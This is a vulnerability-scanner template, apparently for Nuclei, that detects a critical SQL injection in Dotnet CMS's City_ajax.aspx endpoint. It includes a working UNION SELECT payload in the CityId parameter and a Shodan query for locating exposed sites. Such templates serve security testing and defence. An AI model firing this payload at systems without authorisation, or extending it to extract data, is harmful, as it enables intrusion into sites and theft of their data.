id: dotnetcms-sqli
info:
  name: Dotnet CMS -  SQL Injection
  author: ritikchaddha
  severity: critical
  description: Dotnet CMS is prone to SQL injection, enabling attackers to access
    and compromise sensitive data within the affected site.
  reference:
  - https://www.cnblogs.com/rebeyond/p/4951418.html
  - http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0150742
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    shodan-query: http.html:"dotnetcms"
    impact: The SQL injection vulnerability in Dotnet CMS can allow attackers to access
      sensitive data, manipulate it, and perform unauthorized administrative tasks.
    recommendation: It is recommended to update Dotnet CMS immediately to prevent
      SQL injection attacks and unauthorized operations on the affected site.
  tags: dotnetcms,dotnet,sqli
requests:
- method: GET
  path:
  - '{{BaseURL}}/user/City_ajax.aspx?CityId=33''union%20select%20sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{randstr}}'')),2--'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{{md5("{{randstr}}")}}'
  - type: status
    status:
    - 200
